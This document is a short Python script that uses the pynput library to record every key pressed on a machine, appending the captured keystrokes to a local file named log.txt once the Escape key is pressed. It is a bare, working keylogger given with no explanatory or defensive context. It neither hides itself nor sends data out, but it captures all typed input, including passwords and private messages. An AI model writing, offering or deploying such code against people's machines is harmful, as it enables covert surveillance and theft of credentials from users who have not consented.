import pynput
from pynput.keyboard import Key,Listener

keys=[]



def press(key):

	
	keys.append(key)

	if(key==Key.esc):

		write(keys)
		return False


def write(b):

	data="".join(str(e) for e in b)
	
	
	with open('log.txt','a') as l:

		l.write(data)
		







with Listener(on_press=press) as l:

	l.join()


